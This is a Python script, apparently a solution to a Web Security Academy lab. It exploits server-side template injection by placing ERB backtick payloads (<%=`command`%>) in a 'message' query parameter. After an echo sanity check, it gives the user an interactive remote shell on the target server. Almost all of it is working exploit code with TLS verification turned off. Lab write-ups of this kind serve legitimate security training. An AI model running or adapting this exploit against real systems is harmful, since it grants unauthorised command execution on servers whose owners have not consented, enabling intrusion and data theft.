import http.client
import random
import re
import ssl
import string
import urllib

LAB_ID = "???"


def GET_(
        message: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('message', message),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


def random_str() -> str:
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))


def exec_command(command: str) -> str:
    beginning = random_str()
    end = random_str()
    response = GET_(message=f"{beginning}<%=`{command}`%>{end}")
    response_body = response.read().decode()
    return re.findall(rf"(?s){beginning}(.*){end}", response_body)[0]


print("performing sanity check")
expected_str = random_str()
result = exec_command(f"echo {expected_str}")
print(f'expected_str: {expected_str}')
if result != f"{expected_str}\n":
    print("sanity check failed!")
    exit(1)
print("sanity check succeeded!")
print("shell opened")
while True:
    print(exec_command(input("input command: ")))
